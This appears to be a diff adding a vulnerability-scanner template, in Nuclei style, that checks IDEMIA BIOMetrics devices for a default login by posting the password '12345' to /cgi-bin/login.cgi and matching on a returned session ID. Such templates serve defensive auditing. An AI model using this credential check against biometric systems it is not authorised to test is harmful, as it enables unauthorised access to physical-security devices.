@@ -1,0 +1,41 @@
+id: idemia-biometrics-default-login
+info:
+  author: Techryptic (@Tech)
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
+    cvss-score: 5.8
+    cwe-id: CWE-522
+  description: IDEMIA BIOMetrics application  default login credentials were discovered.
+  name: IDEMIA BIOMetrics Default Login
+  reference:
+  - https://www.google.com/search?q=idemia+password%3D+"12345"
+  severity: medium
+  tags: idemia,biometrics,default-login
+requests:
+- matchers:
+  - condition: and
+    type: word
+    words:
+    - session_id=
+    - resource
+  - negative: true
+    part: body
+    type: word
+    words:
+    - Invalid Password
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - '12345'
+  raw:
+  - 'POST /cgi-bin/login.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    password={{password}}
+
+    '
